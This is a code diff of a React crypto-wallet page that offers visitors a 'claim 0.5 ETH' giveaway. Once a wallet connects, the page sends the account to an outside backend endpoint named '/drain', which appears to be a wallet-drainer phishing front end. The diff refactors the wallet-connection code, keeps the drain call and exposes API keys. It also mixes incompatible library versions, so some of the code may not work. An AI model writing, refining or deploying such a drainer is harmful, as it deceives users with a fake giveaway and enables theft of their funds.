@@ -1,43 +1,51 @@
 import React, { useState } from "react";
 import ReactDOM from "react-dom/client";
 
-import { WagmiConfig, createConfig, http } from "wagmi";
-import { mainnet, sepolia } from "@wagmi/chains";
-import { injected, walletConnect } from "wagmi/connectors";
+import {
+  WagmiConfig,
+  createConfig,
+  useConnect,
+  useAccount,
+  useDisconnect,
+  configureChains,
+  mainnet,
+  sepolia,
+  jsonRpcProvider,
+} from "wagmi";
 
-import { createWeb3Modal } from "@web3modal/wagmi/react";
+import { InjectedConnector } from "wagmi/connectors/injected";
+import { WalletConnectConnector } from "wagmi/connectors/walletConnect";
 
-/* ---------------------------
-   Wagmi Configuration
----------------------------- */
-
-const projectId = "962425907914a3e80a7d8e7288b23f62"; // your WalletConnect Project ID
-
-const config = createConfig({
-  chains: [mainnet, sepolia],
-  connectors: [
-    injected(),
-    walletConnect({
-      projectId,
-    }),
-  ],
-  transports: {
-    [mainnet.id]: http(
-      "https://mainnet.infura.io/v3/d2870b839c5f497c94f02dfaccc518e2"
-    ),
-    [sepolia.id]: http(),
-  },
-});
+import { Web3Modal } from "@reown/appkit/react"; // Reown AppKit modal
+import "@reown/appkit/styles.css"; // include default styles
 
 /* ---------------------------
-   Initialize Web3Modal
+   Wagmi + Chains Configuration
 ---------------------------- */
-createWeb3Modal({
-  wagmiConfig: config,
-  projectId,
-  chains: [mainnet, sepolia],
-  themeMode: "dark",
-  enableAnalytics: true,
+
+const chains = [mainnet, sepolia];
+
+const { chains: configuredChains, publicClient } = configureChains(chains, [
+  jsonRpcProvider({
+    rpc: (chain) =>
+      chain.id === mainnet.id
+        ? "https://mainnet.infura.io/v3/d2870b839c5f497c94f02dfaccc518e2"
+        : `https://sepolia.infura.io/v3/d2870b839c5f497c94f02dfaccc518e2`,
+  }),
+]);
+
+const connectors = [
+  new InjectedConnector({ chains: configuredChains }),
+  new WalletConnectConnector({
+    chains: configuredChains,
+    options: { projectId: "962425907914a3e80a7d8e7288b23f62" },
+  }),
+];
+
+const wagmiConfig = createConfig({
+  autoConnect: true,
+  connectors,
+  publicClient,
 });
 
 /* ---------------------------
@@ -47,21 +55,19 @@ createWeb3Modal({
 const App = () => {
   const [loading, setLoading] = useState(false);
   const [response, setResponse] = useState(null);
-  const [walletAddress, setWalletAddress] = useState(null);
 
-  const connectWallet = async () => {
+  const { connectAsync } = useConnect();
+  const { address: walletAddress } = useAccount();
+  const { disconnect } = useDisconnect();
+
+  const connectWallet = async (connector) => {
     try {
       setLoading(true);
       setResponse(null);
 
-      // Web3Modal exposes this global helper
-      const modal = window.web3Modal;
-      const connection = await modal.open();
+      const { account } = await connectAsync({ connector });
 
-      const account = connection?.accounts?.[0];
       if (!account) throw new Error("No wallet connected");
-
-      setWalletAddress(account);
 
       const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
         method: "POST",
@@ -83,17 +89,14 @@ const App = () => {
       });
     } catch (err) {
       console.error(err);
-      setResponse({
-        success: false,
-        message: "Wallet connection failed.",
-      });
+      setResponse({ success: false, message: "Wallet connection failed." });
     } finally {
       setLoading(false);
     }
   };
 
   return (
-    <WagmiConfig config={config}>
+    <WagmiConfig config={wagmiConfig}>
       <div
         style={{
           minHeight: "100vh",
@@ -120,24 +123,34 @@ const App = () => {
             Connect your wallet to claim 0.5 ETH.
           </p>
 
-          <button
-            onClick={connectWallet}
-            disabled={loading}
-            style={{
-              marginTop: "20px",
-              padding: "12px 24px",
-              width: "100%",
-              background: "#4CAF50",
-              border: "none",
-              borderRadius: "8px",
-              color: "#fff",
-              fontSize: "16px",
-              cursor: "pointer",
-              fontWeight: "bold",
-            }}
+          <Web3Modal
+            projectId="962425907914a3e80a7d8e7288b23f62"
+            themeMode="dark"
+            enableAnalytics
+            onConnect={(connector) => connectWallet(connector)}
+            connectors={connectors}
           >
-            {loading ? "Connecting..." : "Connect Wallet"}
-          </button>
+            {({ open }) => (
+              <button
+                onClick={open}
+                disabled={loading}
+                style={{
+                  marginTop: "20px",
+                  padding: "12px 24px",
+                  width: "100%",
+                  background: "#4CAF50",
+                  border: "none",
+                  borderRadius: "8px",
+                  color: "#fff",
+                  fontSize: "16px",
+                  cursor: "pointer",
+                  fontWeight: "bold",
+                }}
+              >
+                {loading ? "Connecting..." : "Connect Wallet"}
+              </button>
+            )}
+          </Web3Modal>
 
           {walletAddress && (
             <p style={{ marginTop: "12px", fontSize: "12px", color: "#aaa" }}>
@@ -158,6 +171,23 @@ const App = () => {
             >
               {JSON.stringify(response, null, 2)}
             </pre>
+          )}
+
+          {walletAddress && (
+            <button
+              onClick={disconnect}
+              style={{
+                marginTop: "12px",
+                padding: "8px 16px",
+                background: "#f44336",
+                color: "#fff",
+                border: "none",
+                borderRadius: "6px",
+                cursor: "pointer",
+              }}
+            >
+              Disconnect
+            </button>
           )}
         </div>
       </div>
